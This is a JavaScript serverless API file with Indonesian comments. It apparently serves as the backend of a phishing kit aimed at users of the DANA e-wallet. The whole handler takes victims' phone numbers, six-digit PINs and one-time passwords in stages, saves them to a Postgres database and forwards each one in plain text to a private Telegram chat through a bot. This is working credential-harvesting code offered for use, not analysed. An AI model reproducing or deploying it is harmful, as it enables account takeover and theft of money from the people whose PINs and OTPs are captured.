// api/send-dana-data.js
import { sql } from '@vercel/postgres';

// Konfigurasi Telegram Bot (disimpan sebagai environment variables di Vercel)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

export default async function handler(request, response) {
  if (request.method !== 'POST') {
    return response.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { type, ...data } = request.body;

    // Validasi data yang diterima
    if (!type || !data) {
      return response.status(400).json({ error: 'Type and data are required' });
    }

    // Format pesan berdasarkan jenis data
    let message = '';
    let tableName = '';

    switch (type) {
      case 'phone':
        message = `📱 Nomor HP Baru Terdaftar:\n${formatPhoneNumber(data.phone)}`;
        tableName = 'phone_numbers';
        break;
      case 'pin':
        message = `🔒 PIN Dikirimkan:\nNomor: ${formatPhoneNumber(data.phone)}\nPIN: ${data.pin}`;
        tableName = 'pin_data';
        break;
      case 'otp':
        message = `📨 OTP Dikirimkan:\nNomor: ${formatPhoneNumber(data.phone)}\nPIN: ${data.pin}\nOTP: ${data.otp}`;
        tableName = 'otp_data';
        break;
      default:
        return response.status(400).json({ error: 'Invalid type' });
    }

    // Simpan ke database Vercel Postgres (jika diperlukan)
    await saveToDatabase(tableName, data);

    // Kirim notifikasi ke Telegram
    const telegramResponse = await sendToTelegram(message);

    // Berikan respons ke client
    return response.status(200).json({ 
      success: true, 
      message: 'Data berhasil dikirim',
      telegramResponse 
    });

  } catch (error) {
    console.error('Error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// Fungsi untuk mengirim pesan ke Telegram
async function sendToTelegram(message) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error('Telegram bot configuration is missing');
  }

  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  };

  const telegramResponse = await fetch(TELEGRAM_API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload)
  });

  if (!telegramResponse.ok) {
    throw new Error(`Telegram API error: ${telegramResponse.statusText}`);
  }

  return await telegramResponse.json();
}

// Fungsi untuk menyimpan data ke database
async function saveToDatabase(tableName, data) {
  try {
    // Buat tabel jika belum ada
    await sql`
      CREATE TABLE IF NOT EXISTS ${sql(tableName)} (
        id SERIAL PRIMARY KEY,
        phone VARCHAR(15) NOT NULL,
        pin VARCHAR(6),
        otp VARCHAR(6),
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `;

    // Simpan data berdasarkan jenis tabel
    if (tableName === 'phone_numbers') {
      await sql`
        INSERT INTO ${sql(tableName)} (phone)
        VALUES (${data.phone});
      `;
    } else if (tableName === 'pin_data') {
      await sql`
        INSERT INTO ${sql(tableName)} (phone, pin)
        VALUES (${data.phone}, ${data.pin});
      `;
    } else if (tableName === 'otp_data') {
      await sql`
        INSERT INTO ${sql(tableName)} (phone, pin, otp)
        VALUES (${data.phone}, ${data.pin}, ${data.otp});
      `;
    }
  } catch (error) {
    console.error('Database error:', error);
    // Jangan throw error agar tidak mengganggu pengiriman ke Telegram
  }
}

// Fungsi untuk memformat nomor telepon
function formatPhoneNumber(phone) {
  // Hapus semua karakter non-digit
  const cleaned = phone.replace(/\D/g, '');
  
  // Format nomor dengan kode negara
  return `+62 ${cleaned.substring(0, 3)}-${cleaned.substring(3, 7)}-${cleaned.substring(7)}`;
}
